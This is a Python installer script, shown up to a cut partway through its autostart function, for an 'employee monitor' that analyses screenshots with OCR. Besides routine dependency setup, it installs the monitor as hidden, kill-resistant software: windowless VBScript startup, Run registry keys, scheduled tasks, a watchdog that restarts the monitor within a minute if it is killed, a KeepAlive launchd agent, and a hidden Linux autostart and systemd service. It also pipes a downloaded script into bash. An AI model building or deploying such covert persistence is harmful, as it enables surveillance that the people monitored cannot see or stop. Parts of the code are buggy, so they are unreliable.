#!/usr/bin/env python3
"""
Standalone installer - Downloads Python if not available and sets up the monitor.
Run with: python install_and_run.py
"""

import os
import sys
import subprocess
import urllib.request
import zipfile
import tempfile
import shutil
import json
import platform
import socket
import signal
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

PYTHON_DOWNLOAD_URL = "https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe"
PYTHON_VERSION_MIN = (3, 8)
WINDOWS_ONLY_REQUIREMENTS = {"pywin32", "pypiwin32"}

def is_windows():
    return os.name == 'nt'

def is_macos():
    return sys.platform == 'darwin'

def is_linux():
    return sys.platform.startswith('linux')

def script_dir():
    return Path(__file__).resolve().parent

def _is_windows_store_python_stub(path_value):
    path_text = str(path_value or '').strip().lower()
    if not path_text:
        return False
    return 'windowsapps' in path_text and (path_text.endswith('python.exe') or path_text.endswith('python3.exe'))

def resolve_python_executable():
    runtime_python = str(Path(sys.executable).resolve()) if sys.executable else ''
    if runtime_python and not _is_windows_store_python_stub(runtime_python):
        return runtime_python

    which_python3 = shutil.which('python3')
    if which_python3 and not _is_windows_store_python_stub(which_python3):
        return which_python3

    which_python = shutil.which('python')
    if which_python and not _is_windows_store_python_stub(which_python):
        return which_python

    py_launcher = shutil.which('py')
    if py_launcher:
        return py_launcher

    return runtime_python or sys.executable


def resolve_monitor_python_executable(prefer_windowless=False):
    python_exec = Path(resolve_python_executable()).resolve()

    if is_windows() and prefer_windowless:
        pythonw_exec = python_exec.with_name('pythonw.exe')
        if pythonw_exec.exists():
            return str(pythonw_exec)

    return str(python_exec)

def cleanup_previous_package():
    package_dir = script_dir()
    package_names = {'employee-monitor-package', 'employeemonitorpackage'}
    current_pid = os.getpid()
    current_dir = package_dir.resolve()

    print("\n[INFO] Cleaning up any previous package run...")

    if is_windows():
        try:
            ps_script = rf"""
$currentPid = {current_pid}
Get-CimInstance Win32_Process |
  Where-Object {{
    $_.ProcessId -ne $currentPid -and (
      ($_.CommandLine -match 'install_and_run\.py') -or
      ($_.CommandLine -match 'monitor\.py') -or
      ($_.CommandLine -match 'employee-monitor-package')
    )
  }} |
  ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }}
"""
            subprocess.run(
                ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_script],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=False
            )
        except Exception:
            pass
    else:
        try:
            ps_output = subprocess.check_output(['ps', '-eo', 'pid=,command='], text=True)
            for raw_line in ps_output.splitlines():
                line = raw_line.strip()
                if not line:
                    continue

                try:
                    pid_text, command_text = line.split(' ', 1)
                    pid = int(pid_text)
                except ValueError:
                    continue

                if pid == current_pid:
                    continue

                command_lower = command_text.lower()
                if (
                    'install_and_run.py' in command_lower or
                    'monitor.py' in command_lower or
                    'employee-monitor-package' in command_lower
                ):
                    try:
                        os.kill(pid, signal.SIGKILL)
                    except Exception:
                        pass
        except Exception:
            pass

    for child in package_dir.parent.iterdir():
        if not child.is_dir():
            continue

        try:
            if child.resolve() == current_dir:
                continue
        except Exception:
            pass

        child_name = child.name.strip().lower().replace(' ', '').replace('_', '').replace('-', '')
        if child_name in package_names:
            try:
                shutil.rmtree(child, ignore_errors=False)
                print(f"[OK] Removed previous package folder: {child}")
            except Exception as exc:
                print(f"[WARN] Could not remove {child}: {exc}")

    for stray_name in ('activity_data', 'activity_monitor.log'):
        stray_path = package_dir / stray_name
        if stray_path.is_dir():
            try:
                shutil.rmtree(stray_path, ignore_errors=False)
                print(f"[OK] Removed previous data folder: {stray_path}")
            except Exception as exc:
                print(f"[WARN] Could not remove {stray_path}: {exc}")
        elif stray_path.exists():
            try:
                stray_path.unlink()
                print(f"[OK] Removed previous file: {stray_path}")
            except Exception as exc:
                print(f"[WARN] Could not remove {stray_path}: {exc}")

def check_python():
    try:
        version = sys.version_info
        if version.major >= PYTHON_VERSION_MIN[0] and version.minor >= PYTHON_VERSION_MIN[1]:
            print(f"[OK] Python {version.major}.{version.minor}.{version.micro} detected")
            return True
    except:
        pass
    print("[!] Python 3.8+ required but not found")
    return False

def download_file(url, dest):
    def report_progress(block_num, block_size, total_size):
        downloaded = block_num * block_size
        percent = min(100, downloaded * 100 // total_size) if total_size > 0 else 0
        print(f"\r  Downloading... {percent}%", end='', flush=True)
    
    print(f"Downloading Python from {url}...")
    urllib.request.urlretrieve(url, dest, reporthook=report_progress)
    print("\n  Download complete!")

def install_python():
    if not is_windows():
        print("[ERROR] Python is required on this platform. Install Python 3 and rerun the installer.")
        return False

    print("\n[INFO] Python not found. Installing...")
    
    with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as tmp:
        installer_path = tmp.name
    
    try:
        download_file(PYTHON_DOWNLOAD_URL, installer_path)
        print("\n[INFO] Running Python installer...")
        print("  (This requires administrator privileges)")
        
        result = subprocess.run(
            [installer_path, '/quiet', 'InstallAllUsers=1', 'PrependPath=1', 'Include_test=0'],
            capture_output=True
        )
        
        if result.returncode == 0:
            print("[OK] Python installed successfully!")
            
            import ctypes
            import time
            for _ in range(10):
                if shutil.which('python'):
                    break
                time.sleep(1)
            
            return True
        else:
            print(f"[ERROR] Installation failed: {result.stderr.decode()}")
            return False
    finally:
        try:
            os.unlink(installer_path)
        except:
            pass




def _ensure_pip():
    """Bootstrap pip if it is missing from the Python installation."""
    check = subprocess.run(
        [sys.executable, '-m', 'pip', '--version'],
        capture_output=True, timeout=30, check=False
    )
    if check.returncode == 0:
        return True  # pip already present

    print("[INFO] pip not found — bootstrapping pip...")

    # 1. ensurepip — built into CPython, works offline
    r = subprocess.run(
        [sys.executable, '-m', 'ensurepip', '--upgrade'],
        capture_output=True, timeout=90, check=False
    )
    if r.returncode == 0:
        print("[OK] pip bootstrapped via ensurepip")
        return True

    # 2. download get-pip.py — install to user directory (no admin needed)
    try:
        import urllib.request as _ur
        get_pip = Path(tempfile.gettempdir()) / 'get-pip.py'
        _ur.urlretrieve('https://bootstrap.pypa.io/get-pip.py', str(get_pip))
        # Try system install first, then --user if that fails
        for extra in [[], ['--user']]:
            r2 = subprocess.run(
                [sys.executable, str(get_pip), '-q'] + extra,
                capture_output=True, timeout=180, check=False
            )
            if r2.returncode == 0:
                mode = 'user directory' if extra else 'system'
                print(f"[OK] pip bootstrapped via get-pip.py ({mode})")
                return True
        err = (r2.stderr or r2.stdout or b'').decode(errors='replace').strip()
        print(f"[WARN] get-pip.py failed: {err[:200]}")
    except Exception as e:
        print(f"[WARN] Could not bootstrap pip: {e}")
    return False


# Packages that require huge downloads (PyTorch etc) — installed in background
# so they never block monitor startup
_HEAVY_PACKAGES = frozenset({
    'sentence-transformers', 'torch', 'torchvision', 'torchaudio',
    'tensorflow', 'transformers', 'xformers',
})

def _pkg_key(spec):
    return spec.split('[')[0].split('==')[0].split('>=')[0].split('<=')[0].split('~=')[0].strip().lower()

def _install_one(pkg, base_flags, timeout):
    """Install one package; retries with --user on permission errors. Returns (status, err)."""
    last_err = ''
    for extra in [[], ['--user']]:
        try:
            r = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '-q', '--prefer-binary', pkg]
                + base_flags + extra,
                capture_output=True, text=True, timeout=timeout, check=False
            )
            if r.returncode == 0:
                return ('OK (user)' if extra else 'OK'), None
            last_err = (r.stderr or r.stdout or '').strip()
        except subprocess.TimeoutExpired:
            return 'TIMEOUT', None
        except Exception as e:
            return 'ERROR', str(e)
    return 'FAILED', last_err[:300]


def _start_background_heavy_install(packages):
    """Launch a fully detached process to install heavy ML packages after monitor is running."""
    if not packages:
        return
    log_path = str(script_dir() / 'setup_log.txt')
    py_exe   = sys.executable

    # Write a small self-contained script to a temp file
    lines = [
        'import subprocess, sys, time',
        f'LOG  = {log_path!r}',
        f'PKGS = {packages!r}',
        f'PY   = {py_exe!r}',
        'time.sleep(20)',
        'with open(LOG, "a", encoding="utf-8", buffering=1) as lf:',
        '    lf.write("\\n[BACKGROUND] Installing heavy packages...\\n")',
        '    for pkg in PKGS:',
        '        lf.write(f"[BACKGROUND] Installing {pkg}...\\n"); lf.flush()',
        '        for extra in [[], ["--user"]]:',
        '            r = subprocess.run([PY, "-m", "pip", "install", "-q", "--prefer-binary", pkg] + extra,',
        '                               capture_output=True, text=True, timeout=3600, check=False)',
        '            if r.returncode == 0:',
        '                lf.write(f"[BACKGROUND] {pkg}: OK\\n"); lf.flush(); break',
        '        else:',
        '            err = (r.stderr or r.stdout or "").strip()[:200]',
        '            lf.write(f"[BACKGROUND] {pkg}: FAILED {err}\\n"); lf.flush()',
        '    lf.write("[BACKGROUND] Done.\\n")',
    ]
    bg_script = Path(tempfile.gettempdir()) / 'em_heavy_install.py'
    bg_script.write_text('\n'.join(lines), encoding='utf-8')

    try:
        if is_windows():
            DETACHED  = 0x00000008
            NEW_GROUP = 0x00000200
            subprocess.Popen(
                [sys.executable, str(bg_script)],
                creationflags=DETACHED | NEW_GROUP,
                close_fds=True,
                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
        else:
            subprocess.Popen(
                [sys.executable, str(bg_script)],
                start_new_session=True,
                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
        print(f"[INFO] {', '.join(packages)} queued for background install — monitor starts now.")
    except Exception as e:
        print(f"[WARN] Could not start background installer: {e}")


def install_requirements():
    import datetime
    print("\n[INFO] Installing required Python packages...")

    # Ensure pip is available (venv always has it; bare Python may not)
    try:
        _ensure_pip()
    except Exception as e:
        print(f"[WARN] pip bootstrap: {e}")

    # Upgrade pip quietly so newer metadata works
    try:
        subprocess.run(
            [sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip', '-q', '--prefer-binary'],
            capture_output=True, timeout=120, check=False
        )
    except Exception:
        pass

    # Read requirements
    try:
        requirements_path = script_dir() / 'requirements.txt'
        all_pkgs = []
        for raw in requirements_path.read_text(encoding='utf-8').splitlines():
            line = raw.strip()
            if not line or line.startswith('#'):
                continue
            if not is_windows() and _pkg_key(line) in WINDOWS_ONLY_REQUIREMENTS:
                continue
            all_pkgs.append(line)
    except Exception as e:
        print(f"[WARN] Could not read requirements.txt: {e}")
        return True

    base_flags   = ['--break-system-packages'] if is_linux() else []
    core_pkgs    = [p for p in all_pkgs if _pkg_key(p) not in _HEAVY_PACKAGES]
    heavy_pkgs   = [p for p in all_pkgs if _pkg_key(p) in _HEAVY_PACKAGES]

    # ── Parallel install of core packages ────────────────────────────────────
    print(f"[INFO] Installing {len(core_pkgs)} core packages in parallel (this takes ~1-2 min)...")
    t0 = datetime.datetime.now()
    failed = []
    completed = [0]

    with ThreadPoolExecutor(max_workers=4) as pool:
        futures = {pool.submit(_install_one, pkg, base_flags, 300): pkg for pkg in core_pkgs}
        for future in as_completed(futures):
            pkg = futures[future]
            completed[0] += 1
            try:
                status, err = future.result()
            except Exception as exc:
                status, err = 'ERROR', str(exc)

            tag = 'OK' if status.startswith('OK') else status
            print(f"  [{completed[0]}/{len(core_pkgs)}] {pkg}: {tag}")
            if err:
                print(f"    [WARN] {err}")
            if not status.startswith('OK'):
                failed.append(pkg)

    elapsed = (datetime.datetime.now() - t0).seconds
    if failed:
        print(f"[WARN] {len(failed)} package(s) failed: {', '.join(failed)}")
    else:
        print(f"[OK] All {len(core_pkgs)} core packages installed in {elapsed}s.")

    # pywin32 needs a post-install step on Windows
    if is_windows():
        try:
            subprocess.run(
                [sys.executable, '-m', 'pywin32_postinstall', '-install'],
                capture_output=True, timeout=60, check=False
            )
        except Exception:
            pass

    # ── Heavy packages: install in background, don't block monitor startup ──
    if heavy_pkgs:
        _start_background_heavy_install(heavy_pkgs)

    return True  # Always return True — monitor must start regardless


def _run_pkg_cmd(label, cmd, timeout=300):
    """Run a package-manager command; return True on success, False on any failure."""
    try:
        print(f"[INFO] {label}...")
        result = subprocess.run(cmd, capture_output=True, check=False, timeout=timeout)
        if result.returncode == 0:
            return True
        stderr = (result.stderr or b'').decode(errors='replace').strip()
        print(f"[WARN] {label} failed (exit {result.returncode}): {stderr[:200] or '(no output)'}")
    except FileNotFoundError:
        pass  # command not on PATH – silent skip
    except Exception as exc:
        print(f"[WARN] {label} error: {exc}")
    return False


def _run_pkg_cmd_no_sudo(label, cmd, timeout=300):
    """Try cmd with sudo first; if sudo itself is missing or denied, retry without it."""
    # Build the sudo variant
    sudo_cmd = ['sudo'] + cmd if shutil.which('sudo') else None
    if sudo_cmd and _run_pkg_cmd(label + ' (sudo)', sudo_cmd, timeout):
        return True
    # Fall back to running without sudo (works in rootless containers / CI)
    return _run_pkg_cmd(label + ' (no sudo)', cmd, timeout)


def try_install_tesseract_macos():
    """Try every available method to install Tesseract on macOS."""
    print("[INFO] Tesseract not found. Trying all available install methods on macOS...")

    # 1. Homebrew (most common)
    brew = shutil.which('brew') or '/opt/homebrew/bin/brew' if os.path.exists('/opt/homebrew/bin/brew') else None
    if not brew:
        brew = '/usr/local/bin/brew' if os.path.exists('/usr/local/bin/brew') else None

    if brew:
        if _run_pkg_cmd('Installing Tesseract via Homebrew', [brew, 'install', 'tesseract']):
            print("[OK] Tesseract installed via Homebrew!")
            return True
        # brew upgrade in case it's already installed but broken
        _run_pkg_cmd('Upgrading Tesseract via Homebrew', [brew, 'upgrade', 'tesseract'])
        if shutil.which('tesseract'):
            return True
    else:
        # 2. Auto-install Homebrew and then install Tesseract
        print("[INFO] Homebrew not found. Attempting to install Homebrew first...")
        try:
            homebrew_install = (
                '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"'
            )
            result = subprocess.run(homebrew_install, shell=True, check=False, timeout=600)
            # Reload brew path after install
            for brew_path in ('/opt/homebrew/bin/brew', '/usr/local/bin/brew'):
                if os.path.exists(brew_path):
                    brew = brew_path
                    break
            if brew and result.returncode == 0:
                print("[INFO] Homebrew installed. Now installing Tesseract...")
                if _run_pkg_cmd('Installing Tesseract via Homebrew', [brew, 'install', 'tesseract']):
                    print("[OK] Tesseract installed via Homebrew!")
                    return True
        except Exception as exc:
            print(f"[WARN] Homebrew auto-install failed: {exc}")

    # 3. MacPorts
    if shutil.which('port'):
        if _run_pkg_cmd('Installing Tesseract via MacPorts', ['sudo', 'port', 'install', 'tesseract']):
            print("[OK] Tesseract installed via MacPorts!")
            return True

    # 4. conda / mamba
    for conda_bin in ('conda', 'mamba', 'micromamba'):
        if shutil.which(conda_bin):
            if _run_pkg_cmd(
                f'Installing Tesseract via {conda_bin}',
                [conda_bin, 'install', '-y', '-c', 'conda-forge', 'tesseract']
            ):
                print(f"[OK] Tesseract installed via {conda_bin}!")
                return True

    print("[WARN] All automatic install methods failed for macOS.")
    return False


def try_install_tesseract_linux():
    """Try every available package manager to install Tesseract on Linux."""
    print("[INFO] Tesseract not found. Trying all available install methods on Linux...")

    # Each entry: (manager_binary, update_cmd_or_None, install_cmd, package_name)
    managers = [
        ('apt-get',  ['apt-get', 'update', '-qq'],            ['apt-get', 'install', '-y', 'tesseract-ocr']),
        ('apt',      ['apt', 'update', '-qq'],                 ['apt', 'install', '-y', 'tesseract-ocr']),
        ('dnf',      None,                                     ['dnf', 'install', '-y', 'tesseract']),
        ('yum',      None,                                     ['yum', 'install', '-y', 'tesseract']),
        ('pacman',   ['pacman', '-Sy', '--noconfirm'],         ['pacman', '-S', '--noconfirm', 'tesseract']),
        ('zypper',   None,                                     ['zypper', 'install', '-y', 'tesseract-ocr']),
        ('apk',      ['apk', 'update'],                        ['apk', 'add', 'tesseract-ocr']),
        ('emerge',   None,                                     ['emerge', 'app-text/tesseract']),
    ]

    for (bin_name, update_cmd, install_cmd) in managers:
        if not shutil.which(bin_name):
            continue

        print(f"[INFO] Found package manager: {bin_name}")

        if update_cmd:
            _run_pkg_cmd_no_sudo(f'Updating package index via {bin_name}', update_cmd, timeout=120)

        if _run_pkg_cmd_no_sudo(f'Installing Tesseract via {bin_name}', install_cmd):
            print(f"[OK] Tesseract installed via {bin_name}!")
            return True

        # Check if it landed despite non-zero exit (some managers print warnings)
        if shutil.which('tesseract'):
            print("[OK] Tesseract is available on PATH after install attempt.")
            return True

    # snap (runs as a service; sudo usually required)
    if shutil.which('snap'):
        if _run_pkg_cmd('Installing Tesseract via snap', ['sudo', 'snap', 'install', 'tesseract'], timeout=180):
            print("[OK] Tesseract installed via snap!")
            return True

    # conda / mamba / micromamba
    for conda_bin in ('conda', 'mamba', 'micromamba'):
        if shutil.which(conda_bin):
            if _run_pkg_cmd(
                f'Installing Tesseract via {conda_bin}',
                [conda_bin, 'install', '-y', '-c', 'conda-forge', 'tesseract']
            ):
                print(f"[OK] Tesseract installed via {conda_bin}!")
                return True

    print("[WARN] All automatic install methods failed for Linux.")
    return False

def download_tesseract_windows():
    """Download and install Tesseract-OCR from official GitHub releases."""
    print("[INFO] Downloading Tesseract OCR installer...")
    
    # Official Tesseract Windows installer
    tesseract_url = "https://github.com/UB-Mannheim/tesseract/releases/download/v5.4.0/tesseract-ocr-w64-setup-v5.4.0.exe"
    install_path = r"C:\Program Files\Tesseract-OCR"
    
    with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as tmp:
        installer_path = tmp.name
    
    try:
        # Download the installer
        print(f"  Downloading from: {tesseract_url}")
        
        def report_progress(block_num, block_size, total_size):
            if total_size > 0:
                downloaded = min(block_num * block_size, total_size)
                percent = (downloaded * 100) // total_size
                print(f"\r  Progress: {percent}%", end='', flush=True)
        
        urllib.request.urlretrieve(tesseract_url, installer_path, reporthook=report_progress)
        print("\n  Download complete!")
        
        # Run the installer silently
        print("[INFO] Running Tesseract installer (this may take a minute)...")
        result = subprocess.run(
            [installer_path, '/S', '/D=' + install_path],
            capture_output=True,
            check=False
        )
        
        if result.returncode == 0:
            print("[OK] Tesseract installed successfully!")
            # Wait a moment for the installation to complete
            import time
            time.sleep(2)
            return True
        else:
            stderr = result.stderr.decode() if result.stderr else ""
            print(f"[WARN] Installer reported an issue: {stderr}")
            # Still check if it was installed despite the return code
            if os.path.exists(os.path.join(install_path, 'tesseract.exe')):
                print("[OK] Tesseract appears to be installed despite installer warning.")
                return True
            return False
    except Exception as e:
        print(f"[ERROR] Failed to download/install Tesseract: {e}")
        return False
    finally:
        try:
            os.unlink(installer_path)
        except:
            pass

def try_install_tesseract_windows():
    print("[INFO] Tesseract not found. Trying automatic install on Windows...")

    # Check for bundled installer first (easiest for portable packages)
    bundled_installers = [
        script_dir() / 'tesseract-ocr-w64-setup-5.5.0.20241111.exe',
        script_dir() / 'tesseract-ocr-w64-setup-v5.4.0.exe',
        script_dir() / 'tesseract-ocr-w64-setup.exe',
    ]
    
    for installer_path in bundled_installers:
        if installer_path.exists():
            print(f"[INFO] Found bundled Tesseract installer: {installer_path.name}")
            print("[INFO] Running bundled Tesseract installer...")
            try:
                install_path = r"C:\Program Files\Tesseract-OCR"
                result = subprocess.run(
                    [str(installer_path), '/S', '/D=' + install_path],
                    capture_output=True,
                    check=False,
                    timeout=300
                )
                
                if result.returncode == 0 or os.path.exists(os.path.join(install_path, 'tesseract.exe')):
                    print("[OK] Tesseract installed from bundled installer!")
                    import time
                    time.sleep(2)
                    return True
            except Exception as e:
                print(f"[WARN] Bundled installer failed: {e}")
    
    # Try built-in package managers (fast if available)
    package_managers = [
        ['winget', 'install', '--id', 'UB-Mannheim.TesseractOCR', '-e', '--silent', '--accept-package-agreements', '--accept-source-agreements'],
        ['choco', 'install', 'tesseract', '-y']
    ]

    for cmd in package_managers:
        if not shutil.which(cmd[0]):
            continue
        try:
            print(f"[INFO] Trying to install with {cmd[0]}...")
            subprocess.run(cmd, check=False, timeout=120)
            # Re-check after each installer attempt.
            if check_tesseract(skip_auto_install=True):
                return True
        except Exception as e:
            print(f"[WARN] {cmd[0]} failed: {e}")
            continue

    # Fall back to downloading official installer
    print("[INFO] Package managers not available. Downloading official installer...")
    if download_tesseract_windows():
        return True

    return False

def check_tesseract(skip_auto_install=False):
    bundled_candidates = [
        script_dir() / 'tesseract' / 'tesseract.exe',
        script_dir() / 'tesseract' / 'bin' / 'tesseract',
        script_dir() / 'tesseract' / 'tesseract',
        script_dir() / 'Tesseract-OCR' / 'tesseract.exe',
        script_dir() / 'Tesseract-OCR' / 'bin' / 'tesseract',
        script_dir() / 'tesseract.exe'
    ]

    candidates = [
        os.environ.get('TESSERACT_CMD', '').strip(),
        shutil.which('tesseract'),
    ]

    for candidate in bundled_candidates:
        if candidate.exists():
            candidates.insert(0, str(candidate))
            break

    if is_windows():
        candidates.extend([
            r'C:\Program Files\Tesseract-OCR\tesseract.exe',
            r'C:\Program Files (x86)\Tesseract-OCR\tesseract.exe',
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs', 'Tesseract-OCR', 'tesseract.exe'),
        ])
    else:
        candidates.extend([
            '/opt/homebrew/bin/tesseract',
            '/usr/local/bin/tesseract',
            '/usr/bin/tesseract',
        ])

    for candidate in candidates:
        if candidate and os.path.exists(candidate):
            print(f"[OK] Tesseract found: {candidate}")
            return True

    if shutil.which('tesseract'):
        print(f"[OK] Tesseract found on PATH: {shutil.which('tesseract')}")
        return True

    if not skip_auto_install:
        if is_windows():
            if try_install_tesseract_windows():
                return True
        elif is_macos():
            if try_install_tesseract_macos():
                return True
        elif is_linux():
            if try_install_tesseract_linux():
                return True

    print("[ERROR] Tesseract OCR is required but was not found.")
    print("        The application cannot function without it for screenshot analysis.")
    return False


def setup_autostart():
    print("\n[INFO] Setting up hidden background auto-start...")

    monitor_path = script_dir() / 'monitor.py'
    python_bin = resolve_monitor_python_executable(prefer_windowless=False)

    if is_windows():
        startup_folder = os.path.join(os.environ.get('APPDATA', str(Path.home())), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        vbs_path = os.path.join(startup_folder, 'EmployeeMonitor.vbs')

        # VBScript executes pythonw (windowless python) fully hidden (0 flag)
        # Using specific environment variable definition solves Unicode logging crashes
        python_exec = resolve_monitor_python_executable(prefer_windowless=True)
        
        # Improved VBScript with better error handling and retry logic
        vbs_content = f'''Set WshShell = CreateObject("WScript.Shell")
WshShell.CurrentDirectory = "{monitor_path.parent}"
Set colSystemEnvVars = WshShell.Environment("Process")
colSystemEnvVars("PYTHONIOENCODING") = "utf-8"

' Add a small delay to ensure system is fully initialized after boot
WScript.Sleep 2000

' Try to run the monitor with retry logic
Dim iRetries, iAttempt
iRetries = 3
For iAttempt = 1 To iRetries
    On Error Resume Next
    WshShell.Run Chr(34) & "{python_exec}" & Chr(34) & " " & Chr(34) & "{monitor_path}" & Chr(34), 0, False
    If Err.Number = 0 Then
        Exit For
    End If
    WScript.Sleep 1000
Next
On Error GoTo 0
'''

        vbs_ok = False
        task_ok = False
        run_key_ok = False

        try:
            Path(vbs_path).parent.mkdir(parents=True, exist_ok=True)
            with open(vbs_path, 'w', encoding='utf-16') as f:
                f.write(vbs_content)
            print(f"[OK] Background auto-start (VBS method) enabled: {vbs_path}")
            vbs_ok = True
        except Exception as e:
            print(f"[WARN] Could not create startup entry: {e}")

        # Add scheduled task - most reliable method for Windows
        try:
            task_name = 'EmployeeMonitorAutoStart'
            tr_value = f'"{python_exec}" "{monitor_path}"'
            result = subprocess.run(
                ['schtasks', '/Create', '/SC', 'ONLOGON', '/RL', 'LIMITED', '/TN', task_name, '/TR', tr_value, '/F', '/NP'],
                capture_output=True,
                text=True,
                check=False
            )
            if result.returncode == 0:
                print(f"[OK] Background auto-start (Task Scheduler) enabled: {task_name}")
                task_ok = True
            else:
                err = (result.stderr or result.stdout or '').strip()
                print(f"[WARN] Could not register scheduled task: {err}")
        except Exception as e:
            print(f"[WARN] Scheduled task setup failed: {e}")

        # Watchdog task — runs every 5 minutes to restart monitor if it was killed
        try:
            watchdog_path = script_dir() / 'watchdog.py'
            if watchdog_path.exists():
                wd_tr = f'"{python_exec}" "{watchdog_path}"'
                subprocess.run(
                    ['schtasks', '/Create', '/SC', 'MINUTE', '/MO', '1',
                     '/TN', 'EmployeeMonitorWatchdog', '/TR', wd_tr, '/F', '/NP'],
                    capture_output=True, text=True, check=False
                )
                print("[OK] Watchdog task registered — monitor restarts within 1 min if killed")
        except Exception as e:
            print(f"[WARN] Watchdog task setup failed: {e}")

        # Add HKCU Run registry entry - fallback if other methods blocked
        try:
            run_value = f'wscript.exe "{vbs_path}"'
            reg_result = subprocess.run(
                [
                    'reg', 'add', r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
                    '/v', 'EmployeeMonitor',
                    '/t', 'REG_SZ',
                    '/d', run_value,
                    '/f'
                ],
                capture_output=True,
                text=True,
                check=False
            )
            if reg_result.returncode == 0:
                print('[OK] Background auto-start (Registry Run) enabled: HKCU\\...\\Run\\EmployeeMonitor')
                run_key_ok = True
            else:
                err = (reg_result.stderr or reg_result.stdout or '').strip()
                print(f"[WARN] Could not register HKCU Run startup value: {err}")
        except Exception as e:
            print(f"[WARN] Registry startup setup failed: {e}")
        
        # Also try HKLM for system-wide startup (requires admin)
        try:
            hklm_run_value = f'"{python_exec}" "{monitor_path}"'
            reg_result = subprocess.run(
                [
                    'reg', 'add', r'HKLM\Software\Microsoft\Windows\CurrentVersion\Run',
                    '/v', 'EmployeeMonitor',
                    '/t', 'REG_SZ',
                    '/d', hklm_run_value,
                    '/f'
                ],
                capture_output=True,
                text=True,
                check=False
            )
            if result.returncode == 0:
                print('[OK] Background auto-start (Registry HKLM) enabled: HKLM\\...\\Run\\EmployeeMonitor')
                run_key_ok = True
        except Exception:
            pass  # HKLM might fail if not admin - that's okay, user/local is sufficient

        success = vbs_ok or task_ok or run_key_ok
        
        if success:
            print("[OK] Auto-start configuration complete (multiple methods enabled for reliability)")
            print("     The monitor will automatically start when you log in or boot the system.")
        else:
            print("[WARN] Could not configure auto-start. Manual startup may be required.")
        
        return success

    if is_macos():
        launch_agents = Path.home() / 'Library' / 'LaunchAgents'
        launch_agents.mkdir(parents=True, exist_ok=True)
        plist_path = launch_agents / 'com.eyeing.monitor.plist'
        plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.eyeing.monitor</string>
  <key>ProgramArguments</key>
  <array>
    <string>{python_bin}</string>
    <string>{monitor_path}</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <true/>
  <key>ThrottleInterval</key>
  <integer>10</integer>
  <key>WorkingDirectory</key>
  <string>{monitor_path.parent}</string>
  <key>StandardErrorPath</key>
  <string>{Path.home()}/.employee-monitor-error.log</string>
  <key>StandardOutPath</key>
  <string>{Path.home()}/.employee-monitor-output.log</string>
</dict>
</plist>
'''
        plist_path.write_text(plist_content, encoding='utf-8')
        print(f"[OK] LaunchAgent written: {plist_path}")

        # Load the plist into launchd immediately so it starts now AND after every reboot.
        # Try modern syntax (macOS 11+) first, fall back to legacy load.
        uid = os.getuid()
        loaded = False
        try:
            # Unload first in case an old version is already registered
            subprocess.run(['launchctl', 'bootout', f'gui/{uid}', str(plist_path)],
                           capture_output=True, check=False)
            r = subprocess.run(['launchctl', 'bootstrap', f'gui/{uid}', str(plist_path)],
                               capture_output=True, check=False)
            loaded = r.returncode == 0
        except Exception:
            pass
        if not loaded:
            try:
                subprocess.run(['launchctl', 'unload', '-w', str(plist_path)],
                               capture_output=True, check=False)
                r = subprocess.run(['launchctl', 'load', '-w', str(plist_path)],
                                   capture_output=True, check=False)
                loaded = r.returncode == 0
            except Exception:
                pass

        if loaded:
            print('[OK] LaunchAgent loaded — monitor runs now and restarts automatically after every reboot/login')
        else:
            print('[WARN] Could not load LaunchAgent immediately. It will activate on next login.')
        return True

    if is_linux():
        import getpass
        monitor_python = resolve_monitor_python_executable(prefer_windowless=False)
        log_out = Path.home() / '.employee-monitor-output.log'
        log_err = Path.home() / '.employee-monitor-error.log'

        # ── Method 1: XDG desktop autostart (GNOME/KDE/XFCE) ──────────────────
        autostart_dir = Path.home() / '.config' / 'autostart'
        autostart_dir.mkdir(parents=True, exist_ok=True)
        desktop_path = autostart_dir / 'employee-monitor.desktop'
        desktop_content = f'''[Desktop Entry]
Type=Application
Name=Employee Monitor
Exec="{monitor_python}" "{monitor_path}"
Terminal=false
X-GNOME-Autostart-enabled=true
NoDisplay=true
'''
        desktop_path.write_text(desktop_content, encoding='utf-8')
        print(f"[OK] Desktop autostart entry: {desktop_path}")

        # ── Method 2: systemd user service ─────────────────────────────────────
        service_ok = False
        try:
            systemd_user_dir = Path.home() / '.config' / 'systemd' / 'user'
            systemd_user_dir.mkdir(parents=True, exist_ok=True)
            service_path = systemd_user_dir / 'employee-monitor.service'
            service_content = f'''[Unit]
Description=Employee Activity Monitor
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
WorkingDirectory={monitor_path.parent}
ExecStart={monitor_python} {monitor_path}
Restart=always
RestartSec=10
StandardOutput=append:{log_out}
StandardError=append:{log_err}

[Install]
WantedBy=default.target
'''
            service_path.write_text(service_content, encoding='utf-8')

            if shutil.which('systemctl'):
                subprocess.run(['systemctl', '--user', 'daemon-reload'],
                               check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['systemctl', '--user', 'enable', 'employee-monitor.service'],
                               check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['systemctl', '--user', 'restart', 'employee-monitor.service'],
                               check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"[OK] systemd user service enabled: {service_path}")
            service_ok = True
        except Exception as e:
            print(f"[WARN] Could not configure systemd user service: {e}")

